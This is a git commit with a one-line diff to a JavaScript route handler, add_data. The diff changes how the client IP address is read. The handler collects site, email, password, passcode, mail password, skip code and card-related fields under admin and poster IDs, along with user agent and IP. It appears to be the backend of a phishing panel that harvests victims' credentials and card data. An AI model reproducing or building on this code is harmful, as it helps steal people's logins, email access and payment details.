df5cd8c169fca53b5893bed2068372f1a88d05ac
rana <rana.buddy@gmail.com>
2023-12-11 22:39:36 +0600

    feat:first commit

--- routes/routehandler.js
+++ routes/routehandler.js
@@ -359,7 +359,7 @@ export const add_data = async (req, res) => {
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard, } = req.body
     const userAgent = req.headers['user-agent'];
-    const ipAddress = req.headers('x-forwarded-for') || req.connection.remoteAddress;
+    const ipAddress = req.connection.remoteAddress;
 
     try {
         const userFound = await User.findOne({ adminId: adminId })
